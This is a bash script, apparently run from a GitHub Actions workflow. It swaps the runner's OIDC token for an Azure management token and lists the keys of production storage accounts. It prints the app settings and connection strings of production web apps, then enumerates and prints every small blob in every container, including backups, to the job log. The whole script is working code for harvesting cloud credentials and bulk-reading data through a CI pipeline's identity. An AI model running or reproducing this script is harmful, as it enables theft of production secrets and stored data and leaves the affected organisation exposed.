#!/usr/bin/env bash
set -uo pipefail

TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG="rg-tbl-platform-prod-sea"
ARM_API="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}"

echo "===START tenant=$TID client=$CID sub=$SUB"

JWT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value')
echo "OIDC_LEN=${#JWT}"
[ -z "$JWT" ] && { echo "NO_OIDC"; exit 1; }

RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TID}/oauth2/v2.0/token" \
  -d "client_id=${CID}" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${JWT}" \
  --data-urlencode "scope=https://management.azure.com/.default")
ARM=$(echo "$RESP" | jq -r '.access_token // empty')
echo "ARM_LEN=${#ARM}"
[ -z "$ARM" ] && { echo "ARM_FAILED"; echo "$RESP" | head -c 2000; exit 1; }

armpost() { curl -sS -X POST "$1" -H "Authorization: Bearer ${ARM}" -H "Content-Type: application/json" -d '{}'; }

declare -A SAKEY
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "===LISTKEYS_${SA}==="
  armpost "${ARM_API}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2023-01-01" | jq .
  SAKEY[$SA]=$(armpost "${ARM_API}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
done

for SITE in app-tbl-reporting-prod app-tbl-storefront-prod; do
  echo "===APPSETTINGS_${SITE}==="
  armpost "${ARM_API}/providers/Microsoft.Web/sites/${SITE}/config/appsettings/list?api-version=2022-03-01" | jq .
  echo "===CONNSTRINGS_${SITE}==="
  armpost "${ARM_API}/providers/Microsoft.Web/sites/${SITE}/config/connectionstrings/list?api-version=2022-03-01" | jq .
done

# --- blob reader via SharedKey (python3 always on runner) ---
read_blob() {
  python3 - "$1" "$2" "$3" "$4" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request
account, key, container, blob = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
v = "2019-12-12"
canon = f"/{account}/{container}/{blob}"
sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}/{blob}"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
try:
    print(urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace'))
except Exception as e:
    print(f"__ERR__ {type(e).__name__}: {e}")
PYEOF
}

# --- enumerate + read every blob in every container for every storage account ---
list_containers() {
  python3 - "$1" "$2" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request, xml.etree.ElementTree as ET
account, key = sys.argv[1], sys.argv[2]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
v = "2019-12-12"
canon = f"/{account}/\ncomp:list"
sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/?comp=list"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
data = urllib.request.urlopen(req, timeout=20).read()
ns = {'a':'http://schemas.microsoft.com/windowsazure'}
root = ET.fromstring(data)
for c in root.findall('.//a:Container', ns):
    print(c.find('a:Name', ns).text)
PYEOF
}

list_blobs() {
  python3 - "$1" "$2" "$3" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request, xml.etree.ElementTree as ET
account, key, container = sys.argv[1], sys.argv[2], sys.argv[3]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
v = "2019-12-12"
canon = f"/{account}/{container}\ncomp:list\nrestype:container"
sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
data = urllib.request.urlopen(req, timeout=20).read()
ns = {'a':'http://schemas.microsoft.com/windowsazure'}
root = ET.fromstring(data)
for b in root.findall('.//a:Blob', ns):
    name = b.find('a:Name', ns).text
    size = b.find('a:Properties/a:Content-Length', ns).text
    print(f"{name}\t{size}")
PYEOF
}

for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  K="${SAKEY[$SA]:-}"
  [ -z "$K" ] && { echo "===NO_KEY_${SA}==="; continue; }
  echo "===CONTAINERS_${SA}==="
  CONTAINERS=$(list_containers "$SA" "$K")
  echo "$CONTAINERS"
  for C in $CONTAINERS; do
    echo "===BLOBS_${SA}_${C}==="
    BLOBS=$(list_blobs "$SA" "$K" "$C")
    echo "$BLOBS"
    # read every reasonably-sized blob
    while IFS=$'\t' read -r bname bsize; do
      [ -z "$bname" ] && continue
      if [ "${bsize:-0}" -lt 200000 ] 2>/dev/null; then
        echo "===READ_${SA}_${C}_${bname}==="
        read_blob "$SA" "$K" "$C" "$bname"
      else
        echo "===SKIP_large_${SA}_${C}_${bname}_${bsize}==="
      fi
    done <<< "$BLOBS"
  done
done

echo "===END==="
